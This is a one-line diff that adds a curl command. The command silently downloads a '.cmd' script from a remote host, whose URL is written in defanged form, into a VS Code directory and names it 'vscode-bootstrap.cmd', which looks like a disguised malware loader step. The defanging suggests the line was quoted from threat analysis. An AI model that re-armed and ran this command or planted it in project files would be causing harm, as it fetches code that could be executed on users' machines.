@@ -1,0 +1,1 @@
+Curl -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" hxxp://vscode-load[.]onrender[.]com/settings/bootstrap?flag=4
